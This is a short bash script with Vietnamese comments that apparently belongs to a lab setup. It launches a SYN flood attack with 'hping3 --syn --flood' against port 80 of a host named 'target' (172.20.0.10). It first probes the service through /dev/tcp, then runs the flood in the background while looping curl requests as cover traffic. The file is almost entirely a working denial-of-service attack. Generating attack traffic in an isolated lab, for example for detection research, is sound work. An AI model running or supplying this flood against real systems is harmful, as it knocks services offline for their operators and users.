#!/bin/bash
# Tan cong: BAN BAO TOI SYN Flood (hping3) sang target (172.20.0.10) port 80.
TARGET=target

# Cho dich vu cua target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/80" 2>/dev/null && break
  sleep 2
done

# Khoi dong cuoc tan cong SYN Flood bang hping3 ngam
sudo hping3 --syn --flood -p 80 ${TARGET} >/dev/null 2>&1 &

# Vong lap duy trì va gui traffic gia lap
while true; do
  curl -s -m 2 http://${TARGET}:80 >/dev/null 2>&1
  sleep 5
done
